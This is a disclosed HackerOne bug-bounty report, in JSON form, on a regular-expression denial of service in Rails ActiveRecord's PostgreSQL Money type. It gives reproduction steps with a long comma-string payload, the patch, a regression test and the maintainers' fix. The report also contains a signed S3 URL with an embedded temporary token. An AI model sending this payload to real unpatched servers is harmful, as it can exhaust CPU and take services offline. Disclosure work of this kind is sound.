{"id":1023899,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDIzODk5","url":"https://hackerone.com/reports/1023899","title":"Regular expression denial of service in ActiveRecord's PostgreSQL Money type","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-11-01T14:22:54.661Z","submitted_at":"2020-11-01T14:22:54.710Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dee-see","url":"/dee-see","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22,"url":"https://hackerone.com/rails","handle":"rails","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ruby on Rails","twitter_handle":null,"website":"http://rubyonrails.org/security","about":"Web development that doesn't hurt."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2021-22880"],"singular_disclosure_disabled":false,"disclosed_at":"2021-02-11T00:13:07.326Z","bug_reporter_agreed_on_going_public_at":"2021-02-11T00:13:07.269Z","team_member_agreed_on_going_public_at":"2021-02-10T23:52:23.937Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\n\nHello team! The regular expressions used in the [Money](https://github.com/rails/rails/blob/ddd0e9b/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb#L29) type to convert strings like `-$100,000.00` to `100000` have an execution time with a quadratic growth proportional to the length of the string.\n\nCausing the denial of service requires very long strings but if the parameter is in a post body that won't be a problem.\n\n## Details\n\nThe regular expressions marked `(1)` and `(2)` in [the following code](https://github.com/rails/rails/blob/ddd0e9b/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb#L28-L33) are the vulnerable expressions\n\n```ruby\n            case value\n            when /^-?\\D*[\\d,]+\\.\\d{2}$/  # (1)\n              value.gsub!(/[^-\\d.]/, \"\")\n            when /^-?\\D*[\\d.]+,\\d{2}$/  # (2)\n              value.gsub!(/[^-\\d,]/, \"\").sub!(/,/, \".\")\n            end\n```\n\nThis code is invoked when Rails saves a user-input value in a `Money` field. If we look at the first expression, the problem comes from this bit `\\D*[\\d,]+`. It matches \"not a number\" 0 or more times and then \"a number or a ,\" one or more times. The `,` can match both expressions so this is somewhat equivalent to `,*,+` as far as the attack is concerned and is where the `O(n^2)` execution time comes from.\n\n## Steps to reproduce\n\nI'm going to assume PostgreSQL is installed and configured on the machine.\n\nNow we'll install the PostgreSQL ruby interface, setup a rails application and scaffold a view for the attack.\n\n```ruby\ngem install pg\nrails new moneydos --database=postgresql\ncd moneydos\nrails db:setup\nrails g scaffold Money amount:money\nrake db:migrate\n```\n\nNow in the `rails console` run these commands. (The same could be accomplished though the UI, but this is simpler for reproduction purpose)\n\n```ruby\napp.host = 'localhost'\napp.get '/money'\ntoken = app.session[:_csrf_token]\napp.post '/money/', params: {money: {amount: (\"$\" + \",\"*100000 + \".11!\")}, authenticity_token: token}\n```\n\nThe last line takes 40 seconds to execute on my machine. Add a 0 to the `\",\"*100000` part and the CPU will pretty much spin forever. An attacker could repeat those requests many times to reach full saturation of the host's CPU capabilities and achieve a complete denial of service.\n\n## Impact\n\nDenial of service and 100% CPU usage in situations where a malicious user is able to input money amounts in a request body (web shops come to mind as the obvious target)","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-03-12T23:52:24.045Z","allow_singular_disclosure_after":-18365097.105403908,"singular_disclosure_allowed":true,"vote_count":32,"voters":["sw33tlie","w31rd0","pirateducky","vp40","ali","mainteemoforfun","sakshamguruji","powerjacobb1","rzx007x","h4x0r_dz","and 22 more..."],"severity":{"rating":"medium","score":5.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":160,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/rails/rails","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9887938,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello team!\n\nI was thinking about how to fix this and I think we can use possessive quantifiers here to avoid the backtracking and still match the same strings\n\n```diff\ndiff --git a/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb b/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb\nindex 357493d..3703e9a 100644\n--- a/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb\n+++ b/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb\n@@ -26,9 +26,9 @@ def cast_value(value)\n \n             value = value.sub(/^\\((.+)\\)$/, '-\\1') # (4)\n             case value\n-            when /^-?\\D*[\\d,]+\\.\\d{2}$/  # (1)\n+            when /^-?\\D*+[\\d,]+\\.\\d{2}$/  # (1)\n               value.gsub!(/[^-\\d.]/, \"\")\n-            when /^-?\\D*[\\d.]+,\\d{2}$/  # (2)\n+            when /^-?\\D*+[\\d.]+,\\d{2}$/  # (2)\n               value.gsub!(/[^-\\d,]/, \"\").sub!(/,/, \".\")\n             end\n```\n\nIt deals with the malicious string without problem\n\n```shell\n$ time ruby -e 'puts (\"$\" + \",\"*100000 + \".11!\").match?(/^-?\\D*+[\\d,]+\\.\\d{2}$/)'\nfalse\n\nreal\t0m0.091s\nuser\t0m0.069s\nsys\t0m0.024s\n```","automated_response":false,"created_at":"2020-11-21T17:43:51.338Z","updated_at":"2020-11-21T17:43:51.338Z","actor":{"username":"dee-see","cleared":true,"url":"/dee-see","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10005814,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello team!\n\nJust a friendly ping to make sure this report didn't fall through some cracks given that the program page says the average time to first response is 2 days and it's been a month.\n\nHave a nice day,\n@dee-see ","automated_response":false,"created_at":"2020-12-04T14:19:39.320Z","updated_at":"2020-12-04T14:19:39.320Z","actor":{"username":"dee-see","cleared":true,"url":"/dee-see","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10279486,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dee-see,\n\nThanks for the reminder. I think your patch looks good, would you be able to write tests for it and we can put out a release?","automated_response":false,"created_at":"2021-01-05T20:10:24.474Z","updated_at":"2021-01-05T20:10:24.474Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10279613,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2021-01-05T20:29:31.289Z","updated_at":"2021-01-05T20:29:31.289Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10281972,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @jack_mccracken!\n\nThere you go:\n\n```diff\ndiff --git a/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb b/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb\nindex 357493dfc0..3703e9a646 100644\n--- a/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb\n+++ b/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb\n@@ -26,9 +26,9 @@ def cast_value(value)\n \n             value = value.sub(/^\\((.+)\\)$/, '-\\1') # (4)\n             case value\n-            when /^-?\\D*[\\d,]+\\.\\d{2}$/  # (1)\n+            when /^-?\\D*+[\\d,]+\\.\\d{2}$/  # (1)\n               value.gsub!(/[^-\\d.]/, \"\")\n-            when /^-?\\D*[\\d.]+,\\d{2}$/  # (2)\n+            when /^-?\\D*+[\\d.]+,\\d{2}$/  # (2)\n               value.gsub!(/[^-\\d,]/, \"\").sub!(/,/, \".\")\n             end\n \ndiff --git a/activerecord/test/cases/adapters/postgresql/money_test.rb b/activerecord/test/cases/adapters/postgresql/money_test.rb\nindex b051a9efc4..da3643e57f 100644\n--- a/activerecord/test/cases/adapters/postgresql/money_test.rb\n+++ b/activerecord/test/cases/adapters/postgresql/money_test.rb\n@@ -64,6 +64,14 @@ def test_money_type_cast\n     assert_equal(-2.25, type.cast(+\"(2.25)\"))\n   end\n \n+  def test_money_regex_backtracking\n+    type = PostgresqlMoney.type_for_attribute(\"wealth\")\n+    Timeout.timeout(0.1) do\n+      assert_equal(0.0, type.cast(\"$\" + \",\" * 100000 + \".11!\"))\n+      assert_equal(0.0, type.cast(\"$\" + \".\" * 100000 + \",11!\"))\n+    end\n+  end\n+\n   def test_sum_with_type_cast\n     @connection.execute(\"INSERT INTO postgresql_moneys (id, wealth) VALUES (1, '123.45'::money)\")\n \n```\n\nAlso attached as a patch file. Let me know if I can help in any other way.\n\nThanks,\n@dee-see ","automated_response":false,"created_at":"2021-01-06T04:40:09.377Z","updated_at":"2021-01-06T04:40:09.377Z","actor":{"username":"dee-see","cleared":true,"url":"/dee-see","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1146115,"filename":"fix_money_regex_dos.patch","type":"text/x-patch","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yyvw4qwzilokcg2izo6fcb3euduu?response-content-disposition=attachment%3B%20filename%3D%22fix_money_regex_dos.patch%22%3B%20filename%2A%3DUTF-8%27%27fix_money_regex_dos.patch\u0026response-content-type=text%2Fx-patch\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131721Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6d349c0602238ff576d4e151a0808ad23a6c52398fd76b2b3a198ffb7cfb41ee"}],"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10629519,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@dee-see thank you so much!  I'll apply this patch, make sure the tests pass, then cut a security release.  Thanks!","automated_response":false,"created_at":"2021-02-09T21:33:18.142Z","updated_at":"2021-02-09T21:33:18.142Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10629566,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Cool! Thanks for the update :)","automated_response":false,"created_at":"2021-02-09T21:42:24.881Z","updated_at":"2021-02-09T21:42:24.881Z","actor":{"username":"dee-see","cleared":true,"url":"/dee-see","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10638237,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2021-02-10T19:43:03.232Z","updated_at":"2021-02-10T19:43:03.232Z","cve_ids":["CVE-2021-22880"],"actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10639718,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"The fix was released on Rails 5.2.4.5, 6.0.3.5 and 6.1.2.1. Thank you fore reporting and working with us in a fix.","automated_response":false,"created_at":"2021-02-10T23:50:31.391Z","updated_at":"2021-02-10T23:50:31.391Z","actor":{"username":"rafaelfranca","cleared":false,"url":"/rafaelfranca","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/981/dd3b6bb41f9c33e3448ebbc47303f5a135f25105_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dee-see","url":"/dee-see"},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10639723,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-02-10T23:51:34.544Z","updated_at":"2021-02-10T23:51:34.544Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Ruby on Rails"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"rails","collaborator":{"username":"dee-see","url":"/dee-see"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10639728,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-02-10T23:52:23.963Z","updated_at":"2021-02-10T23:52:23.963Z","first_to_agree":true,"actor":{"username":"rafaelfranca","cleared":false,"url":"/rafaelfranca","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/981/dd3b6bb41f9c33e3448ebbc47303f5a135f25105_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10639793,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-02-11T00:13:07.286Z","updated_at":"2021-02-11T00:13:07.286Z","actor":{"username":"dee-see","cleared":true,"url":"/dee-see","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10639794,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-02-11T00:13:07.399Z","updated_at":"2021-02-11T00:13:07.399Z","actor":{"username":"dee-see","cleared":true,"url":"/dee-see","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}